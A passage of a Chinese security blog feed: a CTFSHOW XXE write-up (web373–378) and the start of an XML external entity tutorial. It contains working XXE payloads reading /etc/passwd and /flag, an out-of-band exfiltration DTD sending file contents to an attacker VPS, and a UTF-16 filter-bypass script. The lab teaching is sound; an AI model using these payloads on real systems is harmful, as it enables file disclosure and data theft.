class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">c := a + b</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果 3</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-XXE</title>
      <link href="/2023/08/02/CTFSHOW-XXE/"/>
      <url>/2023/08/02/CTFSHOW-XXE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web373"><a href="#web373" class="headerlink" title="web373()"></a>web373()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure><p>打开后发现是一串代码，查看后发现，本题可以将post传进来的内容当xml解析，并且设置了一个dom节点，也就是需要我们构造的标签需要有一个<code>&lt;ctfshow&gt;&lt;/ctfshow&gt;</code>的标签</p><ul><li>检测是否存在xml</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">words</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span>&gt;<span class="symbol">&amp;words;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-XXE/373.png" alt=""></p><p>发现存在xml漏洞，尝试直接读取flag，成功！</p><p><strong>payload：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">words</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span>&gt;<span class="symbol">&amp;words;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-XXE/373_01.png" alt=""></p><h1 id="web374-无回显xxe"><a href="#web374-无回显xxe" class="headerlink" title="web374(无回显xxe)"></a>web374(无回显xxe)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p><code>libxml_disable_entity_loader(false);</code>：这行代码将启用 XML 实体加载器，允许加载外部实体</p><p>发现本题没有回显，可以利用OOB外带，将数据带到我们的vps上</p><p>vps上的<code>flag.dtd</code>，这个是被外部引用的dtd，可以直接写实体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % ccc &quot;&lt;!ENTITY &amp;#x25; aba SYSTEM &#x27;http://xxx.xxx.xxx.xxx:12345?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%ccc;</span><br><span class="line">%aba;</span><br><span class="line">//这个&amp;#x25是character entity reference(字符串实体引用) ，后接预先定义的实体名称，嵌套的时候直接加上</span><br></pre></td></tr></table></figure><p>ccc实体里面嵌套了一个实体aba，aba实体是一个外部实体</p><p>用来访问vps监听的端口，并携带file的值，引用ccc实体，引用aba实体</p><p><strong>payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx.xxx/flag.dtd&quot;&gt;</span><br><span class="line">    %xxe;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><p>在vps开启http服务：</p><blockquote><p><code>python3 -m http.server 12345</code>（在<code>flag.dtd</code>同级目录执行）</p></blockquote><p>利用bp将payload发送，即可在vps上收到数据信息：</p><p><img src="/img/CTFSHOW-XXE/374.png" alt=""></p><h1 id="web375-无回显-过滤"><a href="#web375-无回显-过滤" class="headerlink" title="web375(无回显+过滤)"></a>web375(无回显+过滤)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br></pre></td></tr></table></figure><p>发现跟上道题不同的是，本题过滤了xml头部信息，那我们就不加</p><p>操作与上道题一样</p><p><strong>payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx.xxx/flag.dtd&quot;&gt;</span><br><span class="line">    %xxe;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><h1 id="web376"><a href="#web376" class="headerlink" title="web376()"></a>web376()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>emmm，看了半天，发现跟上道题一样</p><p><code>O.o</code></p><h1 id="web377"><a href="#web377" class="headerlink" title="web377()"></a>web377()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>发现不仅过滤了xml头部信息，还过滤了http</p><p>可以使用编码绕过，这里使用<code>utf-16</code>结合python脚本：</p><p><strong>payload：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://470c58ae-7daa-43aa-b06d-71a244daab3f.challenge.ctf.show/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://xxx/test.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">requests.post(url ,data=payload)</span><br></pre></td></tr></table></figure><p>在vps上开启http服务，运行上述代码，即可得到编码后的flag</p><h1 id="web378"><a href="#web378" class="headerlink" title="web378()"></a>web378()</h1><p>发现是一个登陆页面</p><p><img src="/img/CTFSHOW-XXE/378.png" alt=""></p><p>随便输个值，抓包，发现post值为xml格式：</p><p><img src="/img/CTFSHOW-XXE/378_01.png" alt=""></p><p>检测是否存在xxe：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY hack SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;hack;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-XXE/378_02.png" alt=""></p><p>发现存在xxe，尝试读取<code>/flag</code>：</p><p><strong>payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY hack SYSTEM &quot;file:///flag&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;hack;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>成功！</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE-XML外部实体注入</title>
      <link href="/2023/07/31/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/31/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="XXE基础概念"><a href="#XXE基础概念" class="headerlink" title="XXE基础概念"></a>XXE基础概念</h1><p>XXE(XML External Entity Injection)全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string()。而学习XXE要从认识XML开始。</p><h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签。<br>XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准</p><p><strong>XML 是不作为的。</strong></p><p> XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。、</p><p><strong>举例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的这条便签具有自我描述性。它拥有标题以及留言，同时包含了发送者和接受者的信息。但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p><p>除此之外，XML是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。</p><p><strong>语法规律：</strong></p><ul><li>区分大小写，同时每个标签需要闭合（在burp里面post构造xml的时候，会自动规范格式的）</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Maga</span>&gt;</span>错误<span class="tag">&lt;/<span class="name">maga</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maga</span>&gt;</span>错误</span><br><span class="line"><span class="tag">&lt;<span class="name">maga</span>&gt;</span>正确<span class="tag">&lt;/<span class="name">maga</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>属性值必须加引号</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">data</span>=<span class="string">&quot;7/31/2023&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>lan<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>SpongeBob<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>实体引用时，避免错误闭合，实体化转换问题：</li></ul><div class="table-container"><table><thead><tr><th>\&lt;</th><th>&lt;</th></tr></thead><tbody><tr><td>\&gt;</td><td>&gt;</td></tr><tr><td>\&amp;</td><td>&amp;</td></tr><tr><td>\&apos;</td><td>‘</td></tr><tr><td>\&quot;</td><td>“</td></tr></tbody></table></div><ul><li>注释：<code>&lt;!--八嘎--&gt;</code></li></ul><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p><strong>内部的 DOCTYPE 声明</strong></p><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>外部文档声明</strong></p><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>DTD的作用：</strong></p><ul><li>通过 DTD，每一个 XML 文件均可携带一个有关其自身格式的描述。</li><li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li><li>应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li><li>还可以使用 DTD 来验证自身的数据。</li></ul><h1 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h1><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p><p><strong>实体类别</strong></p><p>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p>但通俗的分为：参数实体和其余实体</p><blockquote><p>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。<br>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p></blockquote><ul><li>内部实体：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>外部实体：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>参数实体：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="熟悉代码结构"><a href="#熟悉代码结构" class="headerlink" title="熟悉代码结构"></a>熟悉代码结构</h1><blockquote><p>第一部分：XML声明部分</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>第二部分：DTD的定义</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;或者&lt;!ENTITY name &quot;hello jazz&quot;&gt;(实体要声明在DTD的里面)</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><blockquote><p>第三部分：文档元素</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>SpongeBob<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hack</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">hack</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>pikachu</strong></p><ul><li>非参数内部实体：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;hello SpongeBob&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>非参数外部实体：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="keyword">hack</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;hack;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>参数内/外实体（%）：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="string">&quot;实体的值&quot;</span>&gt;</span></span><br><span class="line">或者</span><br><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>内部DTD+参数外部实体：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY % name SYSTEM 